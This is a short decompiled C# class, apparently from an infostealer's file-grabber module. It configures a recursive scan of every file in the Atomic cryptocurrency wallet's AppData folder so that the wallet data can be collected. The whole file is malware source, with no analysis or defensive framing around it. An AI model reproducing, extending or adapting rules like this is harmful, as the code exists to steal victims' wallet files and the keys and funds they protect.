using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000014 RID: 20
public class AtomicRule : FileScannerRule
{
	// Token: 0x06000053 RID: 83 RVA: 0x00004F90 File Offset: 0x00003190
	public AtomicRule()
	{
		base.Name = "Atomic";
	}

	// Token: 0x06000054 RID: 84 RVA: 0x00004FA3 File Offset: 0x000031A3
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\atomic", "Atomic");
	}

	// Token: 0x06000055 RID: 85 RVA: 0x00004FCC File Offset: 0x000031CC
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\atomic";
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*",
				Recoursive = true
			});
		}
		catch
		{
		}
		return list;
	}
}
